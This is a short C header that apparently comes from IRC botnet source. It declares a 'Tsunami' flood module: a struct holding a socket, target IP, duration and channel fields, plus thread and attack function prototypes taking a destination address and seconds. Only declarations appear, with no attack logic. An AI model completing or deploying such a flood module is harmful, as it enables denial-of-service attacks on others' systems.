#ifndef NO_TSUNAMI
typedef struct TSUNAMI {
	SOCKET sock;
	char ip[128];
	char length[128];
	char chan[128];
	int threadnum;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;
} TSUNAMI;

DWORD WINAPI TsunamiThread(LPVOID param);
unsigned long Tsunami(TSUNAMI tsn, unsigned long daddr, unsigned int secs);
#endif